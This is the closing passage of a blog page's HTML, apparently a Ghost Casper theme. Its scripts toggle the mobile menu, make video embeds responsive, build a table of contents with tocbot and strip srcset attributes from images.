    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=256e1729b4"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.min.js"></script>

<script>
    tocbot.init({
        // Where to render the table of contents.
        collapseDepth: 6,
        tocSelector: '.gh-toc',
        // Where to grab the headings to build the table of contents.
        contentSelector: '.gh-content',
        // Which headings to grab inside of the contentSelector element.
        headingSelector: 'h1, h2, h3',
        // Ensure correct positioning
        hasInnerContainers: true,
    });

    document.addEventListener('DOMContentLoaded', function() {
        // 获取所有包含srcset属性的元素
        var elementsWithSrcset = document.querySelectorAll('[srcset]');

        // 循环遍历每个元素并删除srcset属性
        elementsWithSrcset.forEach(function(element) {
            element.removeAttribute('srcset');
        });
    });
</script>



</body>
</html>
